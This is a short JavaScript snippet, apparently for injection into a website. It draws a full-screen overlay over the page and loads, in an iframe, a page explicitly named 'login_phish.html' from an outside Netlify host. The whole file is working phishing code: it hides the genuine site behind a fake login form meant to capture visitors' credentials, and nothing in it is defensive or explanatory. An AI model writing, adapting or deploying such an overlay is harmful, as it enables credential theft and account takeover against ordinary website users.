
(function () {
    const LOGIN_URL = "https://amazing-hotteok-d63b06.netlify.app/login_phish.html";

    // Prevent duplicate widgets
    if (document.getElementById("my-login-widget")) return;

    // Create overlay
    const overlay = document.createElement("div");
    overlay.id = "my-login-widget";

    Object.assign(overlay.style, {
        position: "fixed",
        inset: "0",
        background: "rgba(0,0,0,0.65)",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        zIndex: "999999"
    });

    // Create login container
    const container = document.createElement("div");

    Object.assign(container.style, {
        width: "500px",
        maxWidth: "95%",
        padding: "40px",
        borderRadius: "28px",
        background: "#fff",
        position: "relative",
        boxSizing: "border-box"
    });

    // Load your existing website
    const iframe = document.createElement("iframe");
    iframe.src = LOGIN_URL;

    Object.assign(iframe.style, {
        width: "100%",
        height: "500px",
        border: "none",
        display: "block"
    });

    container.appendChild(iframe);
    overlay.appendChild(container);

    document.body.appendChild(overlay);
})();
